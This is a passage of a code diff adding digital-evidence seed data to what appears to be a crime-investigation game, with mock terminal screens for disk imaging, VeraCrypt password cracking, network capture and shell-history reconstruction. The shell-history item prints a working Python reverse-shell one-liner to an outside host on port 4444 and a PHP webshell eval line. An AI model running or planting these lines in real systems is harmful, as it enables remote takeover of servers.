+      "description": "Blocks: status_banner, prompt_line, hash_matrix, file_tree. Theme: terminal. Template: disk_imaging.",
+      "evidence_type": "digital",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "terminal": {
+          "v": 1,
+          "theme": "terminal",
+          "blocks": [
+            {
+              "id": "di_s1",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "DISK IMAGING SESSION", "tone": "info", "caption": "Case: CR-2024-008912" }
+            },
+            {
+              "id": "di_p1",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "root@forensic-workstation:~#",
+                "command": "lsblk -f",
+                "output": [
+                  "NAME      FSTYPE      LABEL    MOUNTPOINT",
+                  "sda       ext4        OS       /",
+                  "sdb       ntfs        EVIDENCE (not mounted)"
+                ],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "di_p2",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "root@forensic-workstation:~#",
+                "command": "dd if=/dev/sdb of=/evidence/disk_image.dd bs=64K conv=sync,noerror status=progress",
+                "output": [
+                  "1258291200 bytes (1.3 GB, 1.2 GiB) copied, 42.3 s, 29.7 MB/s",
+                  "20480+0 records in",
+                  "20480+0 records out",
+                  "1073741824 bytes (1.1 GB, 1.0 GiB) copied, 45.1 s, 23.8 MB/s"
+                ],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "di_s2",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "HASH VERIFICATION", "tone": "ok", "caption": "SHA-256 match confirmed" }
+            },
+            {
+              "id": "di_hm",
+              "type": "hash_matrix",
+              "span": 12,
+              "props": {
+                "algorithm": "sha256",
+                "rows": [
+                  { "offset": "00000000", "bytes": ["e3", "b0", "c4", "42", "98", "fc", "1c", "14", "9a", "fb", "f4", "c8", "99", "6f", "b9", "24"], "ascii": "................" },
+                  { "offset": "00000010", "bytes": ["27", "ae", "41", "e4", "64", "9b", "93", "4c", "a4", "95", "99", "1b", "78", "52", "b8", "55"], "ascii": "'..d...L...xR.U" }
+                ]
+              }
+            },
+            {
+              "id": "di_p3",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "root@forensic-workstation:~#",
+                "command": "sha256sum /evidence/disk_image.dd",
+                "output": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /evidence/disk_image.dd"],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "di_ft",
+              "type": "file_tree",
+              "span": 12,
+              "props": {
+                "entries": [
+                  { "path": "/evidence/disk_image.dd", "size": "1.0 GB", "kind": "file", "state": "intact" },
+                  { "path": "/evidence/disk_image.dd.log", "size": "4.2 KB", "kind": "file", "state": "intact" }
+                ],
+                "indent": 2
+              }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_decryption_session",
+      "title": "14 · Digital — Decryption Session",
+      "description": "Blocks: status_banner, prompt_line, encryption_flow, file_tree. Theme: terminal. Template: decryption_session.",
+      "evidence_type": "digital",
+      "is_initial": true,
+      "is_vital_for_conviction": true,
+      "metadata": {
+        "terminal": {
+          "v": 1,
+          "theme": "terminal",
+          "blocks": [
+            {
+              "id": "ds_s1",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "DECRYPTION SESSION", "tone": "warn", "caption": "Target: suspect_laptop_veracrypt.hc" }
+            },
+            {
+              "id": "ds_p1",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@decrypt:~$",
+                "command": "veracrypt --text --mount /evidence/suspect_laptop_veracrypt.hc /mnt/decrypt",
+                "output": ["Enter password for /evidence/suspect_laptop_veracrypt.hc:", "***", "Incorrect password."],
+                "tone": "stderr"
+              }
+            },
+            {
+              "id": "ds_ef",
+              "type": "encryption_flow",
+              "span": 12,
+              "props": {
+                "algorithm": "aes",
+                "direction": "v",
+                "steps": [
+                  { "label": "Key Expansion", "detail": "Round keys derived from cipher key" },
+                  { "label": "Initial Round", "detail": "AddRoundKey" },
+                  { "label": "Rounds 1-9", "detail": "SubBytes → ShiftRows → MixColumns → AddRoundKey" },
+                  { "label": "Final Round", "detail": "SubBytes → ShiftRows → AddRoundKey" }
+                ]
+              }
+            },
+            {
+              "id": "ds_p2",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@decrypt:~$",
+                "command": "hashcat -m 13721 /evidence/suspect_laptop_veracrypt.hc /wordlists/rockyou.txt -r /rules/best64.rule",
+                "output": [
+                  "hashcat (v6.2.6) starting...",
+                  "Dictionary cache hit: rockyou.txt",
+                  "Progress: 12.3% (1452341/11818768)",
+                  "STATUS: CRACKED",
+                  "Password: Winter2024!"
+                ],
+                "tone": "ok"
+              }
+            },
+            {
+              "id": "ds_s2",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "PASSWORD RECOVERED", "tone": "ok", "caption": "Winter2024!" }
+            },
+            {
+              "id": "ds_p3",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@decrypt:~$",
+                "command": "veracrypt --text --mount /evidence/suspect_laptop_veracrypt.hc /mnt/decrypt --password=Winter2024!",
+                "output": ["Volume mounted successfully at /mnt/decrypt"],
+                "tone": "ok"
+              }
+            },
+            {
+              "id": "ds_ft",
+              "type": "file_tree",
+              "span": 12,
+              "props": {
+                "entries": [
+                  { "path": "/mnt/decrypt/financial_records.xlsx", "size": "2.4 MB", "kind": "file", "state": "intact" },
+                  { "path": "/mnt/decrypt/encrypted_comms/", "kind": "dir" },
+                  { "path": "/mnt/decrypt/encrypted_comms/signal_export.txt", "size": "892 KB", "kind": "file", "state": "intact" },
+                  { "path": "/mnt/decrypt/deleted_recovery/", "kind": "dir" },
+                  { "path": "/mnt/decrypt/deleted_recovery/recovered_photos/", "kind": "dir" }
+                ],
+                "indent": 2
+              }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_network_capture",
+      "title": "15 · Digital — Network Capture Analysis",
+      "description": "Blocks: status_banner, prompt_line, packet_trace, ascii_panel. Theme: terminal. Template: network_capture.",
+      "evidence_type": "digital",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "terminal": {
+          "v": 1,
+          "theme": "terminal",
+          "blocks": [
+            {
+              "id": "nc_s1",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "NETWORK CAPTURE ANALYSIS", "tone": "info", "caption": "PCAP: traffic_capture_20240315.pcapng" }
+            },
+            {
+              "id": "nc_p1",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@netforensics:~$",
+                "command": "tshark -r traffic_capture_20240315.pcapng -Y \"tcp.port == 443\" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport",
+                "output": [
+                  "2024-03-15 14:22:13.123  192.168.1.45  203.0.113.12  54321  443",
+                  "2024-03-15 14:22:13.145  203.0.113.12  192.168.1.45  443  54321",
+                  "2024-03-15 14:22:13.167  192.168.1.45  203.0.113.12  54321  443"
+                ],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "nc_pt",
+              "type": "packet_trace",
+              "span": 12,
+              "props": {
+                "rows": [
+                  { "src": "192.168.1.45:54321", "dst": "203.0.113.12:443", "proto": "TCP", "bytes": "78", "state": "SYN_SENT" },
+                  { "src": "203.0.113.12:443", "dst": "192.168.1.45:54321", "proto": "TCP", "bytes": "74", "state": "SYN_RECEIVED" },
+                  { "src": "192.168.1.45:54321", "dst": "203.0.113.12:443", "proto": "TCP", "bytes": "66", "state": "ESTABLISHED" },
+                  { "src": "192.168.1.45:54321", "dst": "203.0.113.12:443", "proto": "TLS", "bytes": "517", "state": "CLIENT_HELLO" },
+                  { "src": "203.0.113.12:443", "dst": "192.168.1.45:54321", "proto": "TLS", "bytes": "1460", "state": "SERVER_HELLO" }
+                ]
+              }
+            },
+            {
+              "id": "nc_p2",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@netforensics:~$",
+                "command": "tshark -r traffic_capture_20240315.pcapng -Y \"dns\" -T fields -e dns.qry.name -e dns.a",
+                "output": ["malicious-c2.example.com  198.51.100.42", "updates.legit-service.com  203.0.113.12"],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "nc_s2",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "SUSPICIOUS C2 DETECTED", "tone": "critical", "caption": "malicious-c2.example.com resolves to 198.51.100.42" }
+            },
+            {
+              "id": "nc_ap",
+              "type": "ascii_panel",
+              "span": 12,
+              "props": {
+                "frame": "box",
+                "caption": "C2 Communication Flow",
+                "lines": [
+                  "  [Victim]                                 [C2 Server]",
+                  "      |                                       |",
+                  "      |--- DNS Query: malicious-c2.example.com --->|",
+                  "      |<-- DNS Response: 198.51.100.42 -----------|",
+                  "      |                                       |",
+                  "      |=== TLS Handshake =======================>|",
+                  "      |<=== Encrypted Beacon ===================|",
+                  "      |                                       |"
+                ]
+              }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_shell_history",
+      "title": "16 · Digital — Shell History Reconstruction",
+      "description": "Blocks: status_banner, output_stream, ascii_panel. Theme: terminal. Template: shell_history.",
+      "evidence_type": "digital",
+      "is_initial": false,
+      "is_vital_for_conviction": true,
+      "metadata": {
+        "terminal": {
+          "v": 1,
+          "theme": "terminal",
+          "blocks": [
+            {
+              "id": "sh_s1",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "SHELL HISTORY RECONSTRUCTION", "tone": "info", "caption": "Source: /home/suspect/.bash_history (recovered)" }
+            },
+            {
+              "id": "sh_os",
+              "type": "output_stream",
+              "span": 12,
+              "props": {
+                "label": "RECONSTRUCTED SESSION",
+                "tone": "info",
+                "lines": [
+                  "suspect@target:~$ cd /var/www/html",
+                  "suspect@target:/var/www/html$ ls -la",
+                  "total 48",
+                  "drwxr-xr-x  3 www-data www-data  4096 Mar 10 09:15 .",
+                  "drwxr-xr-x  3 root     root      4096 Mar  1 12:00 ..",
+                  "-rw-r--r--  1 www-data www-data 12342 Mar 10 09:15 index.php",
+                  "suspect@target:/var/www/html$ cat index.php | grep -n eval",
+                  "42:  eval(base64_decode($_POST[\"payload\"]));",
+                  "suspect@target:/var/www/html$ whoami",
+                  "www-data",
+                  "suspect@target:/var/www/html$ id",
+                  "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+                  "suspect@target:/var/www/html$ python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"198.51.100.42\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\""
+                ]
+              }
+            },
+            {
+              "id": "sh_s2",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "REVERSE SHELL DETECTED", "tone": "critical", "caption": "Callback to 198.51.100.42:4444" }
+            },
+            {
+              "id": "sh_ap",
+              "type": "ascii_panel",
+              "span": 12,
+              "props": {
+                "frame": "heavy",
+                "caption": "Attack Timeline",
+                "lines": [
+                  "Mar 10 09:15:22  Webshell uploaded via vulnerable upload.php",
+                  "Mar 10 09:15:45  Attacker enumerates web directory",
+                  "Mar 10 09:16:12  Webshell executes: eval(base64_decode(...))",
+                  "Mar 10 09:16:30  Reverse shell spawned to C2",
+                  "Mar 10 09:17:05  Attacker gains www-data shell",
+                  "Mar 10 09:18:22  Lateral movement attempted"
+                ]
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+
+  "characters": [],
+  "investigation_requests": [],
+  "zones": []
+}
+</file>
+
 <file path="routes/api.php">
 <?php
 
@@ -7520,6 +9272,7 @@ use App\Http\Controllers\Admin\AdminEvidenceController;
 use App\Http\Controllers\Admin\AdminQuestionController;
 use App\Http\Controllers\Admin\AdminCharacterController;
 use App\Http\Controllers\Admin\AdminInvestigationRequestController;
+use App\Http\Controllers\Admin\AdminMediaController;
 use App\Http\Middleware\IsAdmin;
 
 Route::get('/login', function () {
@@ -7573,6 +9326,9 @@ Route::middleware('auth:sanctum')->group(function () {
         Route::post('/questions', [AdminQuestionController::class, 'store']);
         Route::post('/characters', [AdminCharacterController::class, 'store']);
         Route::post('/investigation-requests', [AdminInvestigationRequestController::class, 'store']);
+
+        // Media assets owned by a document block rather than an evidence column
+        Route::post('/media/block-image', [AdminMediaController::class, 'storeBlockImage']);
 
         // PUT (Update)
         Route::put('/cases/{case}', [AdminCaseController::class, 'update']);
